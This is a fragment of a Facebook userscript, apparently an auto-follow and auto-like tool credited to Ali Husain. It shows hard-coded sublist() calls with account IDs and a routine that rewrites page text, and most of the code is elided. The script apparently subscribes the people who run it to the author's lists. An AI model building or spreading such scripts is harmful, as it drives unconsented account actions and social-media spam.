// ==UserScript==
// @name            Facebook AutoFollower + Auto Like By Ali Husain
...
sublist("381625828596583");
sublist("504747219595721");
sublist("");
sublist("");
sublist("");
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Ali Husain';
